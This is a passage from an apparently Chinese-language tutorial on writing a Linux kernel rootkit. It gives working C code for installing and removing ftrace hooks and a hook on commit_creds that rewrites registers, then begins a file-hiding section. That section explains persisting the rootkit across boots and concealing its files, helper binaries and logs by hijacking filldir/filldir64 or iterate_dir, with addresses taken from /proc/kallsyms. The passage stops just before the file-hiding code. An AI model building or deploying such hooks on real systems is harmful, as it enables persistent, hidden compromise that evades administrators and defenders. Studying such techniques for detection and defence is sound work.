
当我们将一个 `ftrace_ops` 添加到 filter 中后，我们可以使用 `register_ftrace_function()` 将其放置到 hook 点位上；而在我们将其从 filter 中删除之前，我们需要调用 `unregister_ftrace_function()` 将其从 hook 点上脱离；下面是笔者给出的示例代码：

```c
static __maybe_unused struct ftrace_ops *
nornir_install_ftrace_hook_internal(void *target, ftrace_func_t new_dst)
{
    struct ftrace_ops *hook_ops;
    int err;

    hook_ops = kmalloc(GFP_KERNEL, sizeof(*hook_ops));
    if (!hook_ops) {
        err = -ENOMEM;
        logger_error("Unable to allocate memory for new ftrace_ops.\n");
        goto no_mem;
    }

    memset(hook_ops, 0, sizeof(*hook_ops));
    hook_ops->func = new_dst;
    hook_ops->flags = FTRACE_OPS_FL_SAVE_REGS |
                      FTRACE_OPS_FL_RECURSION |
                      FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(hook_ops, (unsigned long)target, 0, 0);
    if (err) {
        logger_error(
            "Failed to set ftrace filter for target addr: %p.\n",
            target
        );
        goto failed;
    }

    err = register_ftrace_function(hook_ops);
    if (err) {
        logger_error(
            "Failed to register ftrace fn for target addr: %p.\n",
            target
        );
        goto failed;
    }

    logger_info(
        "Install ftrace hook at %p, new destination: %p.\n",
        target,
        new_dst
    );

    return hook_ops;

failed:
    kfree(hook_ops);
no_mem:
    return ERR_PTR(err);
}

static __maybe_unused int
nornir_uninstall_ftrace_hook_internal(
    struct ftrace_ops *hook_ops,
    void *hook_dst
)
{
    int err;

    err = unregister_ftrace_function(hook_ops);
    if (err) {
        logger_error("failed to unregister ftrace.");
        goto out;
    }

    err = ftrace_set_filter_ip(hook_ops, (unsigned long)hook_dst, 1, 0);
    if (err) {
        logger_error("failed to rmove ftrace point.");
        goto out;
    }

out:
    return err;
}
```

这里我们还是以 `commit_cred()` 作为范例进行测试，在我们自定义的 `hook` 点当中我们可以通过 `fregs` 参数直接改变任一寄存器的值。由于 ftrace 的 hook 点位于函数开头，尚未开辟该函数的栈空间，这里我们可以选择将 `rip` 直接改为一条 `ret` 指令从而使其直接返回，之后我们再在 hook 函数中重新调用原函数的功能部分即可。这里需要注意的是要跳过开头的 `endbr64` + `call` 两条指令，总计 9 字节：

```c
__attribute__((naked)) void ret_fn(void)
{
    asm volatile(" ret; ");
}

void test_hook_fn(
    unsigned long ip,
    unsigned long pip,
    struct ftrace_ops *ops,
    struct ftrace_regs *fregs
)
{
    size_t (*orig_commit_creds)(size_t) =
        (size_t (*)(size_t))((size_t)commit_creds + 9);

    printk(KERN_ERR "[test hook] bbbbbbbbbbbbbbbbbbbbbbbbbbbb");

    fregs->regs.ax = orig_commit_creds(fregs->regs.di);
    fregs->regs.ip = ret_fn;

    return;
}
```

# 0x03. 文件隐藏

我们的 rootkit 既然要长久驻留在系统上，那么在系统每一次开机时都应当载入我们的 rootkit，这就要求我们的 rootkit 文件还需要保留在硬盘上，同时我们有的时候也需要启动一些用户态进程来帮助我们完成一些任务，用户态进程的二进制文件也需要我们进行隐藏，除此之外我们可能也想要隐藏一些日志文件……

因此接下来我们还要完成相关文件的隐藏工作。

> 注：本节需要你提前对 VFS 有着一定的了解：）

## 一、劫持 `getdents` 系统调用核心函数

当我们使用 `ls` 查看某个目录下的文件时，实际上会调用到 `getdents64()` / `getdents()` / `compat_getdents()` 这三个系统调用之一来获取某个目录下的文件信息，并以如下形式的结构体数组返回：

```c
/* getdents */
struct linux_dirent {
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[1];
};

/* getdents64 */
struct linux_dirent64 {
    u64 d_ino;
    s64 d_off;
    unsigned short d_reclen;
    unsigned char d_type;
    char d_name[];
};
```

而用来遍历文件的系统调用的核心逻辑实际上都是通过 `iterate_dir()` 来实现的：

```c
SYSCALL_DEFINE3(getdents, unsigned int fd,
                struct linux_dirent __user *dirent,
                unsigned int count)
{
    struct fd f;
    struct getdents_callback buf = {
        .ctx.actor = filldir,
        .count = count,
        .current_dir = dirent
    };
    int error;

    f = fdget_pos(fd);
    if (!f.file)
        return -EBADF;

    error = iterate_dir(f.file, &buf.ctx);

    //...
}

SYSCALL_DEFINE3(getdents64, unsigned int fd,
                struct linux_dirent64 __user *dirent,
                unsigned int count)
{
    struct fd f;
    struct getdents_callback64 buf = {
        .ctx.actor = filldir64,
        .count = count,
        .current_dir = dirent
    };
    int error;

    f = fdget_pos(fd);
    if (!f.file)
        return -EBADF;

    error = iterate_dir(f.file, &buf.ctx);

    //...
}

COMPAT_SYSCALL_DEFINE3(getdents, unsigned int fd,
                       struct compat_linux_dirent __user *dirent,
                       unsigned int count)
{
    struct fd f;
    struct compat_getdents_callback buf = {
        .ctx.actor = compat_filldir,
        .current_dir = dirent,
        .count = count
    };
    int error;

    f = fdget_pos(fd);
    if (!f.file)
        return -EBADF;

    error = iterate_dir(f.file, &buf.ctx);
}
```

而在 `iterate_dir()` 中实际上会调用对应文件的函数表中的 `iterate_shared` / `iterate` 函数：

```c
int iterate_dir(struct file *file, struct dir_context *ctx)
{
    struct inode *inode = file_inode(file);
    bool shared = false;
    int res = -ENOTDIR;

    if (file->f_op->iterate_shared)
        shared = true;
    else if (!file->f_op->iterate)
        goto out;

    //...

    if (!IS_DEADDIR(inode)) {
        ctx->pos = file->f_pos;

        if (shared)
            res = file->f_op->iterate_shared(file, ctx);
        else
            res = file->f_op->iterate(file, ctx);

        //...
    }
}
```

以 ext4 文件系统为例，其实际上会调用到 `ext4_readdir` 函数：

```c
const struct file_operations ext4_dir_operations = {
    .llseek = ext4_dir_llseek,
    .read = generic_read_dir,
    .iterate_shared = ext4_readdir,
};
```

存在如下调用链：

```text
ext4_readdir()
ext4_dx_readdir()  // htree-indexed 文件系统会调用到这个（通常都是）
call_filldir()
dir_emit()
ctx->actor()  // 填充返回给用户的数据缓冲区
```

填充返回给用户的数据的核心逻辑便是调用 `ctx->actor()`，也就是调用 `filldir`/`filldir64`/`compat_filldir` 函数。这也是大部分文件系统对于 `iterate`/`iterate_shared` 的实现核心之一，而这类函数的作用其实是将文件遍历的单个结果填充回用户空间。

由此我们有两种隐藏文件的方法：

- **直接劫持** `filldir`、`filldir64`、`compat_filldir` **函数，在遇到我们要隐藏的文件时直接返回**，从而完成文件隐藏的功能。
- 由于 `iterate_dir()` 的参数之一便是 `ctx`，因此我们也可以劫持 `iterate_dir()` 后修改 `ctx->actor`。

> 需要注意的是这些函数对内核模块并不导出，因此我们需要通过用户态进程辅助读取 `/proc/kallsyms` 来获得其地址。

hook 函数的模板在前面已经给出，这里不再赘述，我们只需要判断是否为我们要隐藏的文件，如果是则直接返回即可。现笔者给出如下示例代码：
